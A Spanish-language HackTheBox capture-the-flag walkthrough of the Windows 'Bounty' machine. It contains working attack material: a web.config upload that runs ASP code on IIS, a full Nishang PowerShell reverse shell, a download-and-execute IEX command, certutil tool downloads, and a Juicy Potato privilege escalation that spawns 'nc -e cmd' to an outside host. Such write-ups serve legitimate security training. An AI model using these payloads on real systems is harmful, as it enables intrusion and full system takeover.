---
title: Bounty | Windows
published: 2025-08-18
image: "./logo.png"
tags: [Easy, Windows, ]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- IIS Enumeration
- Creating our own extension fuzzer in Python [Python Scripting] [EXTRA]
- IIS Exploitation - Executing code via web.config file upload
- Abusing SeImpersonatePrivilege - Juicy Potato [Privilege Escalation]

### Preparación

- eWPT
- OSWE
- OSCP

***

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```bash wrap=false
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.93 -oG nmap/allPorts 
```

| Parámetro           | Descripción                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| `-p-`               | Escanea **todos los puertos** (1-65535).                                                     |
| `--open`            | Muestra **solo puertos abiertos**.                                                           |
| `-sS`               | Escaneo **SYN** (rápido y sigiloso).                                                         |
| `--min-rate 5000`   | Envía al menos **5000 paquetes por segundo** para acelerar el escaneo.                       |
| `-vvv`              | Máxima **verbosidad**, muestra más detalles en tiempo real.                                  |
| `-n`                | Evita resolución DNS.                                                                        |
| `-Pn`               | Asume que el host está activo, **sin hacer ping** previo.                                    |
| `10.10.10.93`       | Dirección IP objetivo.                                                                       |
| `-oG nmap/allPorts` | Guarda la salida en formato **grepable** para procesar con herramientas como `grep` o `awk`. |

```txt wrap=false
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127
```

Ahora con la función **extractPorts**, extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash title="Función de S4vitar"
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat --paging=never extractPorts.tmp
	rm extractPorts.tmp
}
```

```bash wrap=false
nmap -sVC -p80 10.10.10.93 -oN nmap/targeted
```

| Parámetro           | Descripción                                                                          |
| ------------------- | ------------------------------------------------------------------------------------ |
| `-sV`               | Detecta la **versión** de los servicios que están corriendo en los puertos abiertos. |
| `-C`                | Ejecuta **scripts NSE de detección de versiones y configuración**.                   |
| `-p`                | Escanea únicamente los puertos seleccionados.                                        |
| `10.10.10.93`       | Dirección IP objetivo.                                                               |
| `-oN nmap/targeted` | Guarda la salida en **formato normal** en el archivo indicado.                       |

```txt wrap=false
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
```

### Whatweb

Usamos el comando **whatweb** para ver más información:

```bash wrap=false
❯ whatweb 10.10.10.93
http://10.10.10.93 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.93], Microsoft-IIS[7.5], Title[Bounty], X-Powered-By[ASP.NET]
```

### Wfuzz

```bash wrap=false
❯ wfuzz -c --hc=404 -t 200 -L -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt http://10.10.10.93/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.93/FUZZ
Total requests: 26583

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                               
=====================================================================

000000056:   403        29 L     92 W       1233 Ch     "aspnet_client"                                                                                                                                                                       
000001098:   403        29 L     92 W       1233 Ch     "uploadedfiles" 
```

```bash wrap=false
❯ wfuzz -c --hc=404 -t 200 -L -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,asp-aspx http://10.10.10.93/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.93/FUZZ.FUZ2Z
Total requests: 441090

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                               
=====================================================================

000007538:   200        21 L     58 W       941 Ch      "transfer - aspx"   
```

Vemos un `transfet.aspx` y dos directorios:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FYI0LNlOaxCgqZXKujVyn%2Fimage.png?alt=media&#x26;token=b1193dce-c877-41b7-b688-c8c9041c18c8" alt=""><figcaption></figcaption></figure>

Viendo que es una subida de archivos podría estar relacionados:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FynTKOd90k7UxmlZvVCnT%2Fimage.png?alt=media&#x26;token=c26b543e-84bd-4097-b979-dbd2b9185eea" alt=""><figcaption></figcaption></figure>

Efectivamente, sabiendo que es un **IIS**, podemos intentar subir un archivo que llegue a ejecutar comandos. Las extensiones que podrían valer son:

#### ASP / ASP.NET

* .asp
* .aspx
* .ashx
* .asmx
* .asa
* .axd

#### Mapeadas en IIS (dependiendo de la config)

* .cer
* .cdx
* .config
* .htr
* .idc
* .stm
* .shtml

### Web.config

Podemos ver que .config si que nos deja. Investigando podemos ver un artículo que nos provee este código:

```xml title="web.config"
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

Nos dice que al interpretar el codigo si vemos un 3, funciona.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FXF9cgRv3dvaVYUI64LPF%2Fimage.png?alt=media&#x26;token=fc591a9c-d514-43fb-b9b3-860733f3c13e" alt=""><figcaption></figcaption></figure>

Sabiendo que esto funciona, podríamos intentar ejecutar comandos en la máquina víctima. En [https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html](https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html). encontraremos este PoC de ejecución de comandos para ASP.

```xml title="web.config (CMD Execution)"
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set co = CreateObject("WScript.Shell")
Set cte = co.Exec("cmd /c ping 10.10.14.7")
output = cte.StdOut.ReadAll()
Response.write(output)
%>
-->
```

```bash wrap=false
❯ sudo tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:51:25.969338 IP 10.10.10.93 > 10.10.14.7: ICMP echo request, id 1, seq 1, length 40
23:51:25.969352 IP 10.10.14.7 > 10.10.10.93: ICMP echo reply, id 1, seq 1, length 40
23:51:26.968655 IP 10.10.10.93 > 10.10.14.7: ICMP echo request, id 1, seq 2, length 40
23:51:26.968668 IP 10.10.14.7 > 10.10.10.93: ICMP echo reply, id 1, seq 2, length 40
23:51:27.967084 IP 10.10.10.93 > 10.10.14.7: ICMP echo request, id 1, seq 3, length 40
23:51:27.967099 IP 10.10.14.7 > 10.10.10.93: ICMP echo reply, id 1, seq 3, length 40
23:51:28.965358 IP 10.10.10.93 > 10.10.14.7: ICMP echo request, id 1, seq 4, length 40
23:51:28.965371 IP 10.10.14.7 > 10.10.10.93: ICMP echo reply, id 1, seq 4, length 40
```

### Reverse shell

Perfecto, funciona correctamente. Para entablar una **reverse shell** primero buscaremos una en  [https://github.com/samratashok/nishang/tree/master/Shells](https://github.com/samratashok/nishang/tree/master/Shells), concretamente `Invoke-PowerShellTcp.ps1`, una vez descargada la modificaremos de la siguiente manera:

```powershell title="PS.ps1"
function Invoke-PowerShellTcp
{
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch.
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on
the given IP and port.

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port.

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )
    try
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()
            $client = $listener.AcceptTcpClient()
        }

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target."
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
       Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 443
``` 

Y el `web.config` de la siguiente manera:&#x20;

```xml title="web.config"
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set co = CreateObject("WScript.Shell")
Set cte = co.Exec("cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/PS.ps1')")
output = cte.StdOut.ReadAll()
Response.write(output)
%>
-->
```

Todo para poder ejecutar la shell, nos pondremos a la escucha con **rlwrap** y **netcat** por el puerto `443` y levantaremos un servidor web improvisado con **python**, y una vez subido y ejecutado deberíamos obtener la shell.

```powershell wrap=false
PS C:\> whoami
bounty\merlin
# La flag está oculta, por eso usamos -force
PS C:\Users\merlin\Desktop> dir -force


    Directory: C:\Users\merlin\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a-hs         5/30/2018  12:22 AM        282 desktop.ini                       
-arh-         8/18/2025   1:29 AM         34 user.txt                          


PS C:\Users\merlin\Desktop> type user.txt
6c4e6fac84a1bb5c07f8...
```

## Escalada de privilegios

Empezaremos con un `whoami /priv`:

```powershell wrap=false
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Vemos que el privilegio `SeImpersonatePrivilege` está activo para nosotros, este privilegio permite que un proceso o usuario **suplante (impersonate) el contexto de seguridad de otro usuario** después de que este se haya autenticado en el sistema. Podríamos jugar con [https://github.com/ohpe/juicy-potato/](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)  y [https://eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/) para entablar una reverse shell como **administrador**.

Después de haber descargado esos dos binarios, los descargaremos a la máquina víctima con el siguiente comando:

```powershell wrap=false
PS C:\windows\temp\privesc> certutil.exe -f -urlcache -split http://10.10.14.7/JP.exe JP.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.
PS C:\windows\temp\privesc> certutil.exe -f -urlcache -split http://10.10.14.7/nc.exe nc.exe
****  Online  ****
  0000  ...
  b0d8
CertUtil: -URLCache command completed successfully.
```

Y con el **Juicy Potato**, usaremos el siguiente comando:

```powershell wrap=false
PS C:\windows\temp\privesc> ./JP.exe 
JuicyPotato v0.1 

Mandatory args: 
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args: 
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user
PS C:\windows\temp\privesc> ./JP.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\privesc\nc.exe -e cmd 10.10.14.7 4444"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

```powershell wrap=false
C:\Users\Administrator\Desktop>type root.txt
284de6cecaedccd...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/142)

---